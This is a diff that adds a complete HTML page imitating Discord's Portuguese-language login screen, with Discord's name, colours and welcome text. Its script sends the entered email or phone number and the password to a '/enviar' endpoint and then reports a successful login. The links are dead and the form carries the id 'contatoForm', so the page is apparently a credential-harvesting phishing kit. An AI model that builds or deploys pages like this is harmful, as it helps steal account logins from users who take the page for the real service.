@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Discord</title>
+<style>
+  :root {
+    --bg: #1a1b1e;
+    --bg-input: #232428;
+    --border-input: #1e1f22;
+    --text: #f2f3f5;
+    --text-muted: #b5bac1;
+    --link: #00a8fc;
+    --accent: #5865f2;
+    --accent-hover: #4752c4;
+    --focus: #5a9bff;
+    --required: #f23f42;
+    box-sizing: border-box;
+  }
+  *, *::before, *::after { box-sizing: inherit; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 40px 24px;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .container { max-width: 420px; margin: 0 auto; }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+  .logo img { width: 40px; height: 40px; object-fit: contain; }
+  .logo span { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; }
+
+  h1 {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    text-align: center;
+    font-size: 16px;
+    color: var(--text-muted);
+    margin-bottom: 24px;
+  }
+
+  .field { margin-bottom: 20px; }
+
+  label {
+    display: block;
+    font-size: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+    letter-spacing: 0.02em;
+  }
+  label .req { color: var(--required); margin-left: 4px; }
+
+  input {
+    width: 100%;
+    background: var(--bg-input);
+    border: 1px solid var(--border-input);
+    border-radius: 4px;
+    padding: 12px 10px;
+    font-size: 16px;
+    color: var(--text);
+    outline: none;
+    transition: border-color .15s;
+  }
+  input:focus { border-color: var(--focus); }
+
+  .forgot {
+    display: inline-block;
+    margin-top: 6px;
+    font-size: 14px;
+    color: var(--link);
+    text-decoration: none;
+  }
+  .forgot:hover { text-decoration: underline; }
+
+  .btn {
+    width: 100%;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background .15s;
+  }
+  .btn:hover { background: var(--accent-hover); }
+  .btn:disabled { opacity: .6; cursor: default; }
+
+  .register {
+    margin-top: 10px;
+    font-size: 14px;
+    color: var(--text-muted);
+  }
+  .register a { color: var(--link); text-decoration: none; }
+  .register a:hover { text-decoration: underline; }
+
+  .status {
+    text-align: center;
+    font-size: 14px;
+    margin-top: 14px;
+    min-height: 18px;
+  }
+  .status.ok { color: #22c55e; }
+  .status.err { color: var(--required); }
+  .status.info { color: var(--text-muted); }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="icon.png" alt="" aria-hidden="true">
+      <span>Discord</span>
+    </div>
+
+    <h1>Boas-vindas de volta!</h1>
+    <p class="subtitle">Estamos muito animados em te ver novamente!</p>
+
+    <form id="contatoForm">
+
+      <div class="field">
+        <label for="email">E-mail ou número de telefone<span class="req">*</span></label>
+        <input type="text" id="email" name="email" autocomplete="username" required>
+      </div>
+
+      <div class="field">
+        <label for="senha">Senha<span class="req">*</span></label>
+        <input type="password" id="senha" name="senha" autocomplete="current-password" required>
+        <a href="#" class="forgot">Esqueceu sua senha?</a>
+      </div>
+
+      <button class="btn" type="submit">Entrar</button>
+    </form>
+
+    <p class="register">Precisando de uma conta? <a href="#">Registre-se</a></p>
+
+    <p class="status" id="status" role="status" aria-live="polite"></p>
+  </div>
+
+  <script>
+    const form = document.getElementById("contatoForm");
+    const status = document.getElementById("status");
+    const btn = form.querySelector("button");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      status.textContent = "";
+      status.className = "status";
+      btn.disabled = true;
+
+      const senha = document.getElementById("senha").value.trim();
+      const email = document.getElementById("email").value.trim();
+
+      try {
+        const resp = await fetch("/enviar", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ senha, email }),
+        });
+        const dados = await resp.json().catch(() => ({}));
+        if (resp.ok && dados.ok) {
+          status.textContent = "Login realizado com sucesso!";
+          status.className = "status ok";
+          form.reset();
+        } else {
+          status.textContent = dados.erro || "Erro ao entrar.";
+          status.className = "status err";
+        }
+      } catch {
+        status.textContent = "Não foi possível conectar ao servidor.";
+        status.className = "status err";
+      } finally {
+        btn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
